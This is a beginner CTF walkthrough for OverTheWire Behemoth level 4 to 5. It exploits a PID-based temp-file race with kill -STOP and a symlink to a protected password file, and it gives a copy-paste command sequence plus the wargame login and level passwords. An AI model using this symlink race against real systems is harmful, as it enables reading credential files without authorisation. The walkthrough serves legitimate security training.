---
date: 2023-09-02 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 4 → 5 tutorial!!"
permalink: /posts/Over-The-Wire-Behemoth-Level-4-to-5/
tags: [overthewire, behemoth, exploitation, race-condition, priv-esc, walkthrough, ctf, linux, beginner]
description: "A full step-by-step detailed write-up for OverTheWire Behemoth Level 4 → 5!!"
---

<!-- Scoped styles -->
<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-3-to-4/' | relative_url }}">← Previous: Level 3 → 4</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth5.html" target="_blank" rel="noopener">
      Official (Level 5) ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-5-to-6/' | relative_url }}">Next: Level 5 → 6 →</a>
  </div>
</nav>

## Login

Log in as **behemoth4** using the password you obtained from Level 3 → 4.

```bash
ssh behemoth4@behemoth.labs.overthewire.org -p 2221
# password: ietheishei
````

---

## Task

The binary **`/behemoth/behemoth4`** creates a temporary file named after its own **PID** in `/tmp/`, then re-opens it.
If that file doesn’t exist, the program fails.
We can exploit this with a **race condition**: pause the program, replace `/tmp/<pid>` with a symlink to the password file, then let it continue.

---

## A little bit of Theory

* **PID**: every process on Linux has a unique process ID. `$!` expands to the PID of the last background job.
* **Race condition**: a flaw where program behavior depends on exact timing. If attacker can pause or delay, they can swap resources at the right moment.
* **Symlink attack**: creating a symbolic link `/tmp/<pid>` → `/etc/behemoth_pass/behemoth5`. When program re-opens `/tmp/<pid>`, it actually opens the password file.
* **Signals**:

  * `kill -STOP <pid>` pauses a process (like Ctrl+Z).
  * `kill -CONT <pid>` resumes it.

---

## Solution

### 1. Run the binary normally

```bash
cd /behemoth
./behemoth4
```

It exits immediately with no output. Suspicious.
Let’s trace syscalls:

```bash
strace ./behemoth4
```

Key lines:

```
open("/tmp/18680", O_WRONLY|O_CREAT|O_TRUNC, 0600) = 3
close(3)
open("/tmp/18680", O_RDONLY) = -1 ENOENT (No such file or directory)
```

**Explanation:** The program:

1. Creates `/tmp/<pid>`
2. Closes it
3. Immediately re-opens it → file missing!
   That’s our race condition.

---

### 2. Run in background to capture PID

```bash
/behemoth/behemoth4 &
PID=$!
```

* `&` → run program in background.
* `$!` → stores PID of last background command.

Check:

```bash
echo $PID
# e.g. 19283
```

---

### 3. Pause the process

```bash
kill -STOP $PID
```

Program is now frozen right after creating `/tmp/$PID`.

---

### 4. Create symlink

Replace the expected temp file with a symlink to the real password file:

```bash
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
```

Now `/tmp/19283` actually points to `/etc/behemoth_pass/behemoth5`.

---

### 5. Resume process

```bash
kill -CONT $PID
```

When the program continues, it opens `/tmp/$PID` again. Because it’s now a symlink, it reveals the next password:

```
aizeeshing
```

---

## Password

```
aizeeshing
```

---

## Troubleshooting

* **Process ends too fast** → Make sure to pause quickly (`kill -STOP`) or run it in background immediately.
* **Wrong symlink** → Verify `$PID` matches filename in `/tmp`.
* **Permission denied** → Only symlink inside `/tmp` is allowed.
* **Didn’t print password** → Retry; race exploits are timing-sensitive.

---

## Copy-paste quick run

```bash
ssh behemoth4@behemoth.labs.overthewire.org -p 2221

/behemoth/behemoth4 &
PID=$!
kill -STOP $PID
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID
kill -CONT $PID
```

---

**Congrats 🎉** You exploited a race condition with PID-based temp files and used a symlink to read the next password. Welcome to **behemoth5**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
